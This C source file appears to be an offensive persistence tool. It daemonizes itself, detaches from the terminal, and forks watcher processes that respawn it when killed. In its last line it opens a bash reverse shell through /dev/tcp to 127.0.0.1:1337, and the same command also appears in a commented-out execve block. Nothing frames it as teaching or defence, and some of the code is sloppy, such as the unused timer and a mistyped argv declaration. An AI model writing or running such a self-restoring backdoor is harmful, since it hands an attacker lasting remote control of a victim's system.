#define _GNU_SOURCE

#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>

char * log_path = "daemon.log";
char log_content[0x1000] = {0};
int systemd_pid;
/**
 * Generate a reverse shell every ${time_span} seconds
 */
int time_span = 0x4;

int daemonize(){
    // Make child process adopted by init/systemd
    printf("Make child process adopted by init/systemd\n");
    if (fork()) {
        exit(0);
    }
    printf("Finished\n");

    // Become process group leader
    printf("Become process group leader\n");
    setsid();
    printf("Finished\n");

    // Make sure that this process won't acquire a new controlling tty
    printf("Make sure that this process won't acquire a new controlling tty\n");
    if (fork()) {
        exit(0);
    }
    printf("Finished\n");

    // Change working directory
    printf("Change working directory\n");
    chdir("/tmp");
    printf("Finished\n");

    // Change umask to 0 to allow open() creat()
    printf("Change umask to 0 to allow open() creat()\n");
    umask(0);
    printf("Finished\n");

    // Close all inherited files
    printf("Close all inherited files\n");
    fcloseall();
    printf("Finished\n");

    // Use dev null as stdin stdout and stderr
    printf("Use dev null as stdin stdout and stderr\n");
    int fd0 = open("/dev/null", O_RDWR);
    dup(fd0);
    dup(fd0);
    printf("Finished\n");
}

void ensure_running(char * log_path, char * log_content){
    FILE * file = fopen(log_path, "a+");
    fwrite(log_content, strlen(log_content), 1, file);
    fwrite("\n", 1, 1, file);
    fclose(file);
}

int run(){
    if (fork() == 0) {
        while(1) {
            memset(log_content, 0, sizeof(log_content));
            int ppid = getppid();
            if (ppid == systemd_pid) {
                // Parent has been killed
                sprintf(log_content, "Parent has been killed");
                ensure_running(log_path, log_content);
                run();
                break;
            }
            usleep(256);
        }
    }
}

void ertai(int signal_number){
    int status;
    wait(&status);
    run();
}

int main(int argc, char *argv[]){
    // Register signal child handler
    signal(SIGCHLD, ertai);
    // Get systemd pid
    char * systemd_pid_string = getenv("SYSTEMD_PID");
    if (systemd_pid_string == NULL) {
        printf("SYSTEM_PID=`pidof systemd`\n");
        exit(1);
    }
    systemd_pid = atoi(systemd_pid_string);
    // Daemonize
    daemonize();
    // Run
    run();
    // Genreate reverse shell
    sleep(0x04);
    /*
    char *new_argv = {
        "/bin/bash",
        "-c",
        "bash -i >/dev/tcp/127.0.0.1/1337 0>&1",
        NULL
    };
    execve(new_argv[0], new_argv, 0);
    */
    popen("bash -c 'bash -i >/dev/tcp/127.0.0.1/1337 0>&1'", "w");
}
